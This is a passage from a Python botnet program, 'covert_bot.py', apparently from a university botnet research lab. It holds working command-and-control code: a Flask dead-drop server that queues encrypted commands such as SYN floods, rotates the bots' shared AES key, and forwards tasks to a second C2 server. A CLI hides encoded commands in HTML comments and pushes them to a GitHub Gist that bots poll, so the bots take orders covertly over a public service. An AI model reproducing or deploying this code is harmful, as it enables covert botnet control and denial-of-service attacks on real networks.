            server process by restarting it with the new key set.

            Note: this endpoint uses the CURRENT SHARED_SECRET to encode
            the command, so it must be called before any manual restart
            of the dead-drop server changes the key.
            """
            data = request.get_json(silent=True) or {}
            new_secret = data.get("secret", "")
            if not new_secret or len(new_secret) < 8:
                return jsonify({
                    "error": "secret must be at least 8 characters"
                }), 400

            rotation_cmd = {"type": "update_secret", "secret": new_secret}
            encoded = encode_command(rotation_cmd)   # signed with CURRENT key
            _current_payload["encoded"] = encoded
            print(f"[DEAD_DROP] Key rotation queued — "
                  f"new secret: {new_secret[:4]}... "
                  f"(bots will pick up on next poll)")

            # Also forward to Phase 1 C2 so bot_agent.c bots get it
            forwarded = False
            try:
                c2_url  = "http://127.0.0.1:5000/task"
                c2_body = json.dumps({
                    "bot_id":  "all",
                    "type":    "update_secret",
                    "secret":  new_secret,
                    "duration": 10,
                }).encode()
                c2_req = urllib.request.Request(
                    c2_url, data=c2_body,
                    headers={
                        "Content-Type":  "application/json",
                        "X-Auth-Token":  "LAB_RESEARCH_TOKEN_2026",
                    }
                )
                with urllib.request.urlopen(c2_req, timeout=3):
                    pass
                forwarded = True
                print("[DEAD_DROP] Key rotation also forwarded to c2_server /task")
            except Exception:
                pass   # c2_server may not be running during Phase 2 only runs

            return jsonify({
                "status":              "rotation_queued",
                "forwarded_to_c2":     forwarded,
                "note": (
                    "Bots will receive new key on next dead-drop poll (~60 s). "
                    "After one full poll cycle, restart this server with "
                    "SHARED_SECRET set to the new value."
                )
            })

        print(f"[DEAD_DROP] Server running on {host}:{port}")
        print(f"[DEAD_DROP] Set command:   POST /set_command {{\"type\":\"syn_flood\",...}}")
        print(f"[DEAD_DROP] Clear command: POST /clear_command")
        print(f"[DEAD_DROP] Rotate key:    POST /push_key {{\"secret\":\"NEW_KEY\"}}")
        print(f"[DEAD_DROP] Bots poll:     GET  /dead_drop")
        dd_app.run(host=host, port=port, debug=False)

    except ImportError:
        print("[DEAD_DROP] Flask not installed. pip3 install flask")


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "server":
        # Run as dead drop server (on C2 VM)
        run_dead_drop_server()

    elif len(sys.argv) > 1 and sys.argv[1] == "encode":
        # Utility: encode a command for manual posting
        if len(sys.argv) < 3:
            print("Usage: python3 covert_bot.py encode '{\"type\":\"syn_flood\",\"target\":\"192.168.100.20\",\"duration\":30}'")
            sys.exit(1)
        cmd = json.loads(sys.argv[2])
        blob = encode_command(cmd)
        print(f"\nEncoded command ({len(blob)} chars):")
        print(f"<!-- CMD:{blob}:CMD -->")
        print(f"\nPaste this line into your GitHub Gist or dead drop file.")

    elif len(sys.argv) > 1 and sys.argv[1] == "decode":
        # Utility: decode a blob
        blob = sys.argv[2] if len(sys.argv) > 2 else input("Paste blob: ").strip()
        cmd = decode_command(blob)
        print(f"Decoded: {cmd}")

    elif len(sys.argv) > 1 and sys.argv[1] == "gist":
        # Push a command directly to a GitHub Gist (real dead drop)
        #
        # Usage:
        #   export GIST_ID=<your_gist_id>
        #   export GITHUB_TOKEN=<pat_with_gist_scope>
        #   python3 covert_bot.py gist '{"type":"syn_flood","target":"192.168.100.20","duration":20}'
        #   python3 covert_bot.py gist '{"type":"idle"}'   # silence bots
        #
        # The Gist must already exist (create it manually at gist.github.com).
        # The PAT needs only the 'gist' scope.
        #
        # After pushing, bots polling the raw Gist URL will execute the command
        # on their next poll cycle (~60 s).  Point bots at the raw URL:
        #   DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<id>/raw"
        if len(sys.argv) < 3:
            print("Usage: python3 covert_bot.py gist '{\"type\":\"syn_flood\",...}'")
            print("\nRequired environment variables:")
            print("  GIST_ID      — the hex ID from https://gist.github.com/...")
            print("  GITHUB_TOKEN — PAT with 'gist' scope only")
            sys.exit(1)
        cmd = json.loads(sys.argv[2])
        ok = push_to_gist(cmd)
        sys.exit(0 if ok else 1)

    elif len(sys.argv) > 1 and sys.argv[1] == "rotate":
        # Rotate AES key via the lab dead-drop server's /push_key endpoint.
        # Usage: python3 covert_bot.py rotate <new_secret>
        if len(sys.argv) < 3:
            print("Usage: python3 covert_bot.py rotate <new_secret>")
            sys.exit(1)
        new_secret = sys.argv[2]
        dd_url = "http://192.168.100.10:5001/push_key"
        body   = json.dumps({"secret": new_secret}).encode()
        req    = urllib.request.Request(
            dd_url, data=body,
            headers={"Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                result = json.loads(resp.read().decode())
            print(json.dumps(result, indent=2))
        except Exception as e:
            print(f"ERROR: {e}")
            sys.exit(1)

    else:
        # Run as bot agent (on bot VMs)
        print("=" * 60)
        print(" Phase 2 Covert Bot - AUA Botnet Research Lab")
        print(" ISOLATED ENVIRONMENT ONLY")
        print("=" * 60)
        bot = CovertBot()
        bot.run()